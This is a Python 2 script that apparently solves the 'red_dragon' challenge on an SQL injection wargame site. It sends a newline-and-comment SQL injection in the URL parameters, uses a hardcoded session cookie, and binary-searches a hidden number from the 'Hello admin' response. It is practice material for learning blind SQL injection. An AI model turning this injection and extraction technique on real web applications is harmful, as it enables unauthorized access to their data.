#!/usr/bin/env python

import urllib
import urllib2
import sys

URL = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=6a6k2j9arcl8e1bbe36q4u6670"


def query(Q):
    # print urllib.quote(Q)
    UURL = URL + "?id=%27||no%3E%23&no=%0a" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)
    text = res.read()
    if "location.href" in text:
        print "Session expired..."
        sys.exit()
        
    return "<h2>Hello admin</h2>" in text


def find_val():
    left = 0
    right = 1000000000
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("{}".format(mid)):
            left = mid+1
        else:
            right = mid
    return right

print find_val()
